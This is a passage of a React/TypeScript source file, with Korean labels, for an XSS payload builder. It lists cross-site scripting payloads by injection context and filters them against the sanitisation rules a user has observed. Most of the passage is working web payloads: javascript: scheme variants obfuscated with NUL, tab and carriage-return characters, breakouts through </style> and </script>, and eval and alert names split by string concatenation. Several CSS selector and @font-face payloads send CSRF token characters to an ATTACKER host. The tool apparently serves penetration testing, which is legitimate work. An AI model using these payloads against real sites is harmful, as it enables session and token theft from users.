      { id: 'vbscript-scheme-legacy', label: 'vbscript: 스킴 (⚠ 구형 IE 전용, 참고용)', text: 'vbscript:MsgBox+1',
        principle: '⚠ javascript: 만 막는 필터는 구형 IE 가 지원하던 또 다른 스크립트 스킴(vbscript:)은 막지 못한다 — 현재 브라우저에서는 동작하지 않으므로 오래된 레거시 인트라넷 진단용 참고.' },
      { id: 'js-scheme-slash-star-comment', label: 'javascript:/*...*/ — 블록 주석으로 중간 문자 숨기기', text: 'javascript:/*-/*`/*\\`/*\'/*"/**/alert(document.domain)//',
        principle: '블록 주석(/* */)을 여러 겹 겹쳐서, 어떤 인용부호 컨텍스트로 반사되든 그 중 한 겹의 주석 처리로 자연스럽게 빠져나오게 만든 폴리글랏형 스킴 값 — "javascript: 로 시작하는지"만 보는 필터는 그대로 통과시킨다.' },
      { id: 'js-scheme-nullbyte', label: 'java + null byte + script: (NUL 삽입)', text: 'java\x00script:alert(document.domain)',
        principle: '문자열 끝으로 취급될 수 있는 NUL(0x00) 바이트를 스킴 중간에 끼워 넣는다 — 일부 저수준 문자열 처리/레거시 파서는 NUL을 만나면 비교를 멈추거나 건너뛰어, "javascript:" 연속 문자열 매칭에 실패하게 만든다.' },
      { id: 'protocol-relative-encoded', label: '프로토콜 상대 경로를 퍼센트 인코딩으로', text: '%2f%2fATTACKER/phish',
        principle: 'protocol-relative(//ATTACKER)와 동일한 목적이지만 슬래시 두 개를 퍼센트 인코딩(%2f%2f)해 "// 로 시작하는지"를 원문 문자열로 검사하는 필터를 피해간다 — 반사 지점이 URL 디코딩을 거치는 컨텍스트에서만 유효.' },
      { id: 'srcdoc-value-breakout', label: 'srcdoc 값 자체가 반사될 때 (HTML 엔티티 인코딩 상태)', text: '&lt;svg onload=alert(document.domain)&gt;',
        principle: '반사 지점이 iframe srcdoc 속성값 "그 자체"라면, 가장 바깥쪽에서 한 번 HTML 엔티티로 인코딩해 넣는 것만으로 충분하다 — 브라우저가 srcdoc 을 해석하는 과정에서 엔티티가 풀리며 다시 HTML로 파싱된다. 원문에는 꺾쇠가 전혀 없어 lt-strip/lt-entity 필터와 무관하다.' },
      { id: 'js-scheme-mixed-tab-case', label: 'j\\tAvaScRipt: — 대소문자 혼용 + 탭 삽입 동시 적용', text: 'j\tAvaScRipt:alert(document.domain)',
        principle: '대소문자 혼용(case-insensitive 우회)과 탭 문자 삽입(정확한 연속 문자열 우회)을 동시에 적용 — 둘 중 하나만 대응하는 필터는 막지 못한다.' },
      { id: 'js-scheme-cr-raw', label: 'java + 실제 캐리지리턴 + script: (원문자 그대로)', text: 'java\rscript:alert(document.domain)',
        principle: '탭·개행과 동일한 원리의 캐리지리턴(0x0D) 버전 — 셋 중 일부만 걸러내는 필터가 있다면 나머지로 우회된다.' },
    ],
  },
  {
    id: 'css',
    label: 'CSS (style 속성 / <style> 블록)',
    hint: 'style="HERE" 속성 안, 또는 <style>HERE</style> 블록 안에 반사될 때. 최신 브라우저에서 CSS만으로 JS를 직접 실행하는 경로는 거의 죽었다는 점을 먼저 알아둘 것.',
    payloads: [
      { id: 'style-block-breakout', label: '</style> 로 탈출 후 태그 삽입', text: '</style><img src=x onerror=alert(document.domain)>',
        principle: '`</style>` 로 CSS 파싱 컨텍스트를 탈출해 일반 HTML 태그를 삽입 — 결국 HTML 컨텍스트 이탈 문제로 귀결된다.' },
      { id: 'style-attr-breakout', label: '속성 탈출 후 태그 삽입', text: '"><img src=x onerror=alert(document.domain)>',
        principle: 'style 속성도 결국 HTML 속성이라 attr-dq 와 동일한 탈출 방식이 그대로 적용된다.' },
      { id: 'css-exfil-selector', label: 'CSS 속성 선택자 기반 데이터 유출 (JS 실행 없음)', text: '<style>input[name=csrf_token][value^="a"]{background:url(//ATTACKER/leak?c=a)}</style>',
        principle: 'JS 실행이 전혀 아니다 — 속성 선택자가 매치될 때만 background url() 요청이 발생하는 걸 이용해 글자 단위로 값을 blind exfiltration. on*/script/javascript: 키워드 필터와 완전히 무관.' },
      { id: 'css-expression-legacy', label: 'CSS expression() (IE 레거시, 참고용)', text: 'width:expression(alert(document.domain))',
        principle: '⚠ IE7 이하에서만 동작했던 레거시 기법 — 현재 사용 중인 브라우저에서는 사실상 동작하지 않는다. 오래된 사내 레거시 시스템 진단 시 참고만.' },
      { id: 'moz-binding-legacy', label: '-moz-binding: XBL (⚠ 구형 Firefox 전용, 참고용)', text: '<div style="-moz-binding:url(//ATTACKER/xbl.xml#xss)">',
        principle: '⚠ 구형 Firefox 의 XBL 바인딩 기능으로 외부 XML에 정의된 스크립트를 CSS 만으로 끌어오던 기법 — 최신 브라우저에서는 XBL 자체가 제거되어 동작하지 않는다. CSS 만으로 JS 실행이 가능했던 시절의 참고 사례.' },
      { id: 'css-import-exfil', label: '@import 로 외부 스타일시트 요청 자체를 신호로 사용 (JS 실행 없음)', text: '<style>@import url(//ATTACKER/track.css);</style>',
        principle: 'JS 실행이 전혀 아니다 — 이 <style> 블록이 파싱되는 순간 브라우저가 무조건 외부 CSS를 요청하므로, "이 페이지가 로드됐다"는 사실 자체를 공격자 서버로 알리는 비컨(beacon)으로 쓸 수 있다. on*/script/javascript: 키워드 필터와 완전히 무관.' },
      { id: 'style-attr-breakout-formaction', label: 'style 속성 탈출 후 formaction 벡터 (on* 핸들러 없음)', text: '"><form><button formaction=javascript:alert(document.domain)>x</button></form>',
        principle: 'style 속성도 결국 HTML 속성이라 attr-dq 와 동일한 탈출이 적용되는데, 삽입하는 벡터를 on* 핸들러가 전혀 없는 formaction 으로 바꾸면 on-attr 필터와는 완전히 무관해진다.' },
      { id: 'css-has-selector-exfil', label: ':has() 선택자로 다른 입력값의 존재를 유출 (JS 없음)', text: '<style>form:has(input[name=csrf_token][value^="a"]){background:url(//ATTACKER/leak?c=a)}</style>',
        principle: '기존 속성 선택자 유출 기법에 최신 CSS 관계 선택자(:has())를 더한 변형 — "값이 a로 시작하는 csrf 토큰 input을 가진 form"에만 매치되도록 해서, 자기 자신이 아닌 조상/형제 요소 기준으로도 동일한 글자 단위 blind exfiltration이 가능함을 보여준다.' },
      { id: 'css-font-face-exfil', label: '@font-face + unicode-range 로 특정 글자 사용 여부를 유출 (JS 없음)', text: '<style>@font-face{font-family:x;src:url(//ATTACKER/leak?c=a);unicode-range:U+0061;}*{font-family:x,sans-serif;}</style>',
        principle: '페이지 안에 해당 유니코드 범위(여기선 소문자 a)의 글자가 실제로 렌더링될 때만 브라우저가 그 폰트 파일을 요청한다는 동작을 이용 — 특정 글자가 화면에 쓰였는지 여부를 JS 없이 네트워크 요청 발생으로 알아낼 수 있다.' },
    ],
  },
  {
    id: 'json-html',
    label: 'JSON-in-HTML (JS로 평가/삽입되는 JSON 값)',
    hint: 'var data = {"key":"HERE"}; 처럼 <script> 안 JS 리터럴 값으로 반사되거나, 그 값이 이후 document.write/innerHTML 같은 sink로 흘러들어갈 때.',
    payloads: [
      { id: 'script-close', label: '</script> 로 블록 조기 종료', text: '</script><script>alert(document.domain)</script>',
        principle: 'JSON 이 <script> 블록 안에 있을 때 `</script>` 로 그 블록을 조기 종료하고 새 script를 바로 삽입 — JSON.parse 가 아니라 응답 전체가 HTML에 직접 꽂히는 구현에서 발생.' },
      { id: 'arith-breakout', label: '산술 연산자로 세미콜론 없이 주입', text: '"-alert(document.domain)-"',
        principle: '세미콜론·콤마 없이 `-` 연산자로 표현식 안에 함수 호출을 끼워 넣어, 가치가 NaN이 되더라도 뒤에 남는 JS 구조는 깨지 않는다 — 값이 JSON.parse 가 아니라 <script> 안 JS 리터럴로 직접 실행되는 구현에서 통한다.' },
      { id: 'unicode-escape-onerror', label: '유니코드 이스케이프로 "onerror" 자체를 안 씀', text: '<img src=x \\u006F\\u006E\\u0065\\u0072\\u0072\\u006F\\u0072=alert(document.domain)>',
        principle: '이 값이 JS 문자열 리터럴 소스 안에 있을 때, `\\u006F...` 는 JS 파서가 파싱 시점에 "onerror" 로 미리 디코딩한다. 네트워크로 전달되는 원문 바이트에는 "onerror" 라는 문자열 자체가 없어서 텍스트 기반 키워드 스캔을 통과하고, 런타임에는 정상적인 onerror 속성이 된다. document.write/eval류 sink 필요 — innerHTML 은 onerror 같은 속성은 그대로 동작하지만 <script> 태그 자체는 실행되지 않는다는 점은 유의.',
        immuneAlways: ['on-attr-ci', 'on-attr-cs'] },
      { id: 'plain-innerhtml', label: '가장 단순한 형태 (sink가 바로 innerHTML/document.write)', text: '<img src=x onerror=alert(document.domain)>',
        principle: 'JSON 값이 그대로 innerHTML/document.write 로 들어가는 가장 단순한 경우 — 별도 JSON 구조 우회 없이 HTML 인젝션 문제로 바로 환원된다.' },
      { id: 'alt-exec-bracket-concat', label: '문자열 연결로 쪼갠 함수명 (func-blacklist 우회)', text: `"-window['a'+'lert'](document.domain)-"`,
        principle: '세미콜론 없이 산술(-) 연산자로 끼워 넣는 기존 기법에, 함수명을 문자열 연결로 쪼개는 기법을 더했다 — JSON.parse 가 아니라 <script> 안 JS 리터럴로 직접 실행되는 구현에서, 세미콜론 필터와 func-blacklist 를 동시에 우회한다.' },
      { id: 'nested-html-in-json-value', label: 'JSON 값 안에 또 다른 인코딩된 HTML을 중첩', text: '<img src=x onerror=&#97;lert(document.domain)>',
        principle: '바깥쪽에서 한 번 HTML 엔티티로 인코딩된 값이 innerHTML 같은 sink로 들어가 다시 한 번 HTML로 파싱될 때, 안쪽의 &#97; 는 그 시점에 "a" 로 디코딩되어 결국 alert 가 완성된다 — 원문 바이트 스캔 시점에는 "alert" 연속 문자열이 없어 func-blacklist를 우회.' },
      { id: 'json-formaction-sink', label: 'sink가 innerHTML일 때 formaction 벡터 (on* 핸들러 없음)', text: '<form><button formaction=javascript:alert(document.domain)>x</button></form>',
        principle: 'JSON 값이 그대로 innerHTML 로 들어가는 가장 단순한 구조에, on* 핸들러가 전혀 없는 formaction 벡터를 얹은 변형 — on-attr 필터가 있어도 이 조합에는 영향이 없다.' },
      { id: 'json-throw-onerror', label: '세미콜론 없이 throw+onerror 로 주입', text: '";throw onerror=alert,document.domain;//',
        principle: 'JSON 값이 JSON.parse 가 아니라 <script> 안 JS 리터럴로 직접 실행되는 구현에서, 세미콜론·괄호 호출 형태 둘 다 피해가는 throw/onerror 재활용 기법을 그대로 적용한 변형.' },
      { id: 'json-bracket-concat-func', label: '문자열 연결로 쪼갠 eval까지 함께 (func-blacklist 2종 동시 우회)', text: `"-self['ev'+'al']('al'+'ert(document.domain)')-"`,
        principle: 'arith-breakout 와 동일한 뼈대(세미콜론 없이 - 연산자로 끼워 넣기)에, eval과 alert 두 함수명을 모두 문자열 연결로 쪼개는 기법을 더해 func-blacklist 우회 범위를 넓힌 변형.' },
    ],
  },
]

/* ── 3. 컴포넌트 ─────────────────────────────────────────────────── */

export function XssPayloadBuilder() {
  const [ctxId, setCtxId] = useState(CONTEXTS[0].id)
  const [checks, setChecks] = useState<Record<string, boolean>>({})
  const [blockText, setBlockText] = useState('')

  const ctx = CONTEXTS.find(c => c.id === ctxId)!
  const checkedSet = useMemo(() => new Set(Object.entries(checks).filter(([, v]) => v).map(([k]) => k)), [checks])
  const keywords = useMemo(() => blockText.split('\n').map(s => s.trim()).filter(Boolean), [blockText])

  const toggle = (id: string) => setChecks(c => ({ ...c, [id]: !c[id] }))
  const clearAll = () => { setChecks({}); setBlockText('') }

  const results = ctx.payloads.filter(p => {
    for (const f of FILTERS) {
      if (checkedSet.has(f.id) && isBlocked(p, f.id, checkedSet)) return false
    }
    const lower = p.text.toLowerCase()
    if (keywords.some(k => lower.includes(k.toLowerCase()))) return false
    return true
  })

  const checkedCount = checkedSet.size
  const excludedCount = ctx.payloads.length - results.length

  return <div className="payload-builder xss-guide">
    <NoteWithCopy copyText={xssScoutScript} copyLabel="스카우트 스크립트 복사">{DISCLAIMER}</NoteWithCopy>

    <Pick label="1. 삽입 위치 (컨텍스트)" value={ctxId} onChange={setCtxId}
      options={CONTEXTS.map(c => ({ id: c.id, label: c.label }))}/>
    <p className="payload-builder-hint">{ctx.hint}</p>

    <div className="xss-guide-filters-head">
      <label className="payload-builder-label" style={{ margin: 0 }}>2. 관찰된 필터 동작 (체크할수록 결과가 좁혀집니다)</label>
      {(checkedCount > 0 || keywords.length > 0) && <button className="xss-guide-clear" onClick={clearAll}>전체 해제</button>}
    </div>
    {FILTER_CATEGORIES.map(cat => <div className="xss-guide-group" key={cat.id}>
      <p className="xss-guide-group-title">{cat.label}</p>
      {FILTERS.filter(f => f.category === cat.id).map(f => <label className="cheatsheet-option" key={f.id}>
        <input type="checkbox" checked={!!checks[f.id]} onChange={() => toggle(f.id)}/>
        <span className="cheatsheet-option-body">
          <span className="cheatsheet-option-head"><b>{f.label}</b></span>
          {f.hint && <small>{f.hint}</small>}
        </span>
      </label>)}
    </div>)}

    <label className="payload-builder-label" htmlFor="xss-guide-blocklist">3. 체크박스로 못 잡는 차단 키워드 (한 줄에 하나씩)</label>
    <textarea id="xss-guide-blocklist" className="payload-builder-textarea" rows={3} value={blockText}
      onChange={e => setBlockText(e.target.value)}
      placeholder={'예: <script> (전체 문자열만 막히고 < 단독은 안 막히는 compound 필터)\nalert('}/>
    <p className="payload-builder-hint">입력한 각 줄을 대소문자 구분 없이 포함하는 페이로드는 결과에서 제외되고, 그 줄을 쓰지 않는 다른 기법으로 자동 대체됩니다.</p>

    <div className="xss-guide-results">
      <p className="payload-builder-label" style={{ margin: '14px 0 6px' }}>
        결과 — 전체 {ctx.payloads.length}개 중 {results.length}개 통과
        {(checkedCount > 0 || keywords.length > 0) && <> (필터 {checkedCount}개 · 차단 키워드 {keywords.length}개로 {excludedCount}개 제외)</>}
      </p>
      {results.length === 0 ? <Note>
        남은 페이로드가 없습니다. 이 조합에서는 참고 목록에 있는 클라이언트 측 우회가 없다는 뜻일 수 있습니다 — 체크를 하나씩 해제하며 정확히 어떤 조건이 막는지 역추적하거나, 다른 삽입 지점(속성/URL/JS 등 다른 컨텍스트)을 확인해보세요.
      </Note> : results.map(p => <div className="xss-guide-result" key={p.id}>
        <Readout title={p.label} value={p.text} wrap="anywhere"/>
        <p className="payload-builder-hint">{p.principle}</p>
      </div>)}
    </div>
  </div>
}
